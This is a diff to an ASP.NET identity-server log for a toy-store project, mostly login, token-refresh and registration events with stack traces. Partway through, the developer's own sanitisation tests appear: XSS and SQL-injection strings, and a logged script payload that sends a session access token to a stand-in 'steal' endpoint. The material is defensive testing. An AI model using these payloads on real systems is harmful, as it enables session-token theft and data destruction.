@@ -161,3 +161,479 @@ System.Security.SecurityException: Refresh-токен отсутствует.
 2025-05-10 17:08:07.377 +05:00 [INF] HTTP POST /auth/login responded 400 in 4.2605 ms
 2025-05-10 17:09:15.406 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.4447 ms
 2025-05-10 17:09:17.336 +05:00 [INF] HTTP POST /auth/login responded 400 in 3.2900 ms
+2025-05-10 17:13:39.742 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 18.9587 ms
+2025-05-10 17:13:39.872 +05:00 [INF] HTTP POST /auth/login responded 400 in 83.4249 ms
+2025-05-10 17:13:46.331 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.3967 ms
+2025-05-10 17:13:46.342 +05:00 [INF] HTTP POST /auth/login responded 400 in 5.5710 ms
+2025-05-10 17:13:47.160 +05:00 [INF] HTTP POST /auth/login responded 400 in 10.2546 ms
+2025-05-10 17:14:46.373 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 1.3975 ms
+2025-05-10 17:14:46.385 +05:00 [INF] HTTP POST /auth/login responded 400 in 3.3280 ms
+2025-05-10 17:15:02.127 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 0.7262 ms
+2025-05-10 17:15:08.716 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 224
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 220
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 17:15:08.716 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 224
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 220
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 17:15:08.729 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 17:15:08.734 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 17:15:08.737 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 6606.2247 ms
+2025-05-10 17:15:08.737 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 1709.2735 ms
+2025-05-10 17:15:15.172 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.1700 ms
+2025-05-10 17:15:15.567 +05:00 [WRN] Неверный пароль у пользователя sergei05037@gmail.com
+2025-05-10 17:15:15.707 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Неверный пароль.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 118
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 220
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 17:15:15.719 +05:00 [WRN] Ошибка 403: Неверный пароль. | Path: /auth/login
+2025-05-10 17:15:15.721 +05:00 [INF] HTTP POST /auth/login responded 403 in 546.0200 ms
+2025-05-10 17:15:26.593 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.2925 ms
+2025-05-10 17:15:26.831 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 17:15:26.994 +05:00 [INF] HTTP POST /auth/login responded 200 in 378.7374 ms
+2025-05-10 17:15:44.768 +05:00 [INF] HTTP GET /.well-known/openid-configuration responded 404 in 0.1825 ms
+2025-05-10 17:49:35.197 +05:00 [INF] HTTP GET /.well-known/openid-configuration responded 404 in 0.2553 ms
+2025-05-10 18:29:49.131 +05:00 [INF] HTTP GET /.well-known/openid-configuration responded 404 in 0.2501 ms
+2025-05-10 18:34:47.489 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 0.7403 ms
+2025-05-10 18:35:09.264 +05:00 [INF] HTTP POST /auth/refresh-token responded 200 in 21770.2748 ms
+2025-05-10 18:35:10.275 +05:00 [INF] HTTP GET /.well-known/openid-configuration responded 404 in 0.2450 ms
+2025-05-10 19:10:59.822 +05:00 [INF] Header [Accept]: RAW = ["*/*"] | CLEAN = */*
+2025-05-10 19:10:59.869 +05:00 [INF] Header [Connection]: RAW = ["keep-alive"] | CLEAN = keep-alive
+2025-05-10 19:10:59.872 +05:00 [INF] Header [Host]: RAW = ["localhost:5115"] | CLEAN = localhost:5115
+2025-05-10 19:10:59.873 +05:00 [INF] Header [User-Agent]: RAW = ["PostmanRuntime/7.43.3"] | CLEAN = PostmanRuntime/7.43.3
+2025-05-10 19:10:59.875 +05:00 [INF] Header [Accept-Encoding]: RAW = ["gzip, deflate, br"] | CLEAN = gzip, deflate, br
+2025-05-10 19:10:59.876 +05:00 [INF] Header [Content-Type]: RAW = ["application/json"] | CLEAN = application/json
+2025-05-10 19:10:59.877 +05:00 [INF] Header [Content-Length]: RAW = ["162"] | CLEAN = 162
+2025-05-10 19:10:59.878 +05:00 [INF] Header [Postman-Token]: RAW = ["058ba651-236a-46d6-ac45-791200294ad8"] | CLEAN = 058ba651-236a-46d6-ac45-791200294ad8
+2025-05-10 19:10:59.899 +05:00 [INF] RAW JSON Body:
+{
+  "email": "<script>alert('xss')</script>@test.com",
+  "password": "password123'; DROP TABLE users; --",
+  "fingerprint": "<img src=x onerror=alert(1)>"
+}
+
+2025-05-10 19:10:59.900 +05:00 [INF] CLEAN JSON Body:
+{"email":"\u003Cscript\u003Ealert(\u0027xss\u0027)\u003C/script\u003E@test.com","password":"password123\u0027; DROP TABLE users; --","fingerprint":"\u003Cimg src=x onerror=alert(1)\u003E"}
+2025-05-10 19:11:00.082 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.UnauthorizedAccessException: Пользователь не найден.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 80
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 19:11:00.141 +05:00 [WRN] Ошибка 401: Пользователь не найден. | Path: /auth/login
+2025-05-10 19:11:00.171 +05:00 [INF] HTTP POST /auth/login responded 401 in 266.7170 ms
+2025-05-10 19:11:35.489 +05:00 [INF] Header [Accept]: RAW = ["*/*"] | CLEAN = */*
+2025-05-10 19:11:35.537 +05:00 [INF] Header [Connection]: RAW = ["keep-alive"] | CLEAN = keep-alive
+2025-05-10 19:11:35.540 +05:00 [INF] Header [Host]: RAW = ["localhost:5115"] | CLEAN = localhost:5115
+2025-05-10 19:11:35.543 +05:00 [INF] Header [User-Agent]: RAW = ["PostmanRuntime/7.43.3"] | CLEAN = PostmanRuntime/7.43.3
+2025-05-10 19:11:35.544 +05:00 [INF] Header [Accept-Encoding]: RAW = ["gzip, deflate, br"] | CLEAN = gzip, deflate, br
+2025-05-10 19:11:35.545 +05:00 [INF] Header [Content-Type]: RAW = ["application/json"] | CLEAN = application/json
+2025-05-10 19:11:35.547 +05:00 [INF] Header [Content-Length]: RAW = ["162"] | CLEAN = 162
+2025-05-10 19:11:35.548 +05:00 [INF] Header [Postman-Token]: RAW = ["153bc020-201c-45be-99df-237f966bee54"] | CLEAN = 153bc020-201c-45be-99df-237f966bee54
+2025-05-10 19:11:35.566 +05:00 [INF] RAW JSON Body:
+{
+  "email": "<script>alert('xss')</script>@test.com",
+  "password": "password123'; DROP TABLE users; --",
+  "fingerprint": "<img src=x onerror=alert(1)>"
+}
+
+2025-05-10 19:11:35.567 +05:00 [INF] CLEAN JSON Body:
+{"email":"\u003Cscript\u003Ealert(\u0027xss\u0027)\u003C/script\u003E@test.com","password":"password123\u0027; DROP TABLE users; --","fingerprint":"\u003Cimg src=x onerror=alert(1)\u003E"}
+2025-05-10 19:11:35.769 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.UnauthorizedAccessException: Пользователь не найден.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 80
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 19:11:35.805 +05:00 [WRN] Ошибка 401: Пользователь не найден. | Path: /auth/login
+2025-05-10 19:11:35.829 +05:00 [INF] HTTP POST /auth/login responded 401 in 258.0914 ms
+2025-05-10 19:13:29.284 +05:00 [WRN] Тело запроса очищено:
+{
+  "email": "<script>alert('xss')</script>@test.com",
+  "password": "password123'; DROP TABLE users; --",
+  "fingerprint": "<img src=x onerror=alert(1)>"
+}
+
+=>
+{"email":"alert(\u0027xss\u0027)@test.com","password":"password123\u0027;  TABLE users; ","fingerprint":""}
+2025-05-10 19:13:29.422 +05:00 [INF] HTTP POST /auth/login responded 400 in 85.2295 ms
+2025-05-10 19:19:01.757 +05:00 [FTL] 🚨 Обнаружена потенциальная атака в поле 'email': <script>alert('xss')</script>@test.com
+2025-05-10 19:23:59.623 +05:00 [FTL] 🚨 Обнаружена потенциальная атака в поле 'email': <script>fetch('http://localhost:9999/steal?token=' + sessionStorage.getItem('accessToken'))</script>@test.com
+2025-05-10 19:24:02.467 +05:00 [FTL] 🚨 Обнаружена потенциальная атака в поле 'email': <script>fetch('http://localhost:9999/steal?token=' + sessionStorage.getItem('accessToken'))</script>@test.com
+2025-05-10 19:26:18.188 +05:00 [FTL] 🚨 Обнаружена потенциальная атака в поле 'email': <script>fetch('http://localhost:9999/steal?token=' + sessionStorage.getItem('accessToken'))</script>@test.com
+2025-05-10 19:49:15.239 +05:00 [INF] HTTP GET /auth responded 404 in 26.7394 ms
+2025-05-10 19:49:15.239 +05:00 [INF] HTTP GET /auth/refresh-token responded 405 in 27.2063 ms
+2025-05-10 19:51:40.767 +05:00 [INF] HTTP GET /.well-known/openid-configuration responded 404 in 0.6891 ms
+2025-05-10 19:51:40.959 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 2.0625 ms
+2025-05-10 19:54:30.220 +05:00 [INF] HTTP GET / responded 404 in 17.1256 ms
+2025-05-10 19:54:45.700 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 4.7440 ms
+2025-05-10 19:54:46.095 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 19:54:46.394 +05:00 [INF] HTTP POST /auth/login responded 200 in 667.6812 ms
+2025-05-10 19:55:44.022 +05:00 [INF] HTTP OPTIONS /auth/register responded 204 in 0.7988 ms
+2025-05-10 19:55:44.200 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.InvalidOperationException: Пользователь с таким email уже зарегистрирован.
+   at IdentityServer.Services.AuthService.RegisterAsync(RegisterRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 37
+   at IdentityServer.Controllers.AuthController.Register(RegisterRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 24
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 19:55:44.226 +05:00 [WRN] Ошибка 422: Пользователь с таким email уже зарегистрирован. | Path: /auth/register
+2025-05-10 19:55:44.245 +05:00 [INF] HTTP POST /auth/register responded 422 in 212.8138 ms
+2025-05-10 19:55:49.047 +05:00 [INF] HTTP GET /auth responded 404 in 0.3562 ms
+2025-05-10 19:55:49.048 +05:00 [INF] HTTP GET /auth/refresh-token responded 405 in 0.3131 ms
+2025-05-10 19:57:14.115 +05:00 [INF] HTTP OPTIONS /auth/register responded 204 in 0.9590 ms
+2025-05-10 19:57:14.365 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.InvalidOperationException: Пользователь с таким email уже зарегистрирован.
+   at IdentityServer.Services.AuthService.RegisterAsync(RegisterRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 37
+   at IdentityServer.Controllers.AuthController.Register(RegisterRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 24
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 19:57:14.376 +05:00 [WRN] Ошибка 422: Пользователь с таким email уже зарегистрирован. | Path: /auth/register
+2025-05-10 19:57:14.380 +05:00 [INF] HTTP POST /auth/register responded 422 in 258.5567 ms
+2025-05-10 19:57:20.647 +05:00 [INF] HTTP POST /auth/register responded 200 in 2494.4805 ms
+2025-05-10 20:12:28.173 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 24.9978 ms
+2025-05-10 20:12:28.655 +05:00 [WRN] Неверный пароль у пользователя sergei05037@gmail.com
+2025-05-10 20:12:28.830 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Неверный пароль.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 117
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
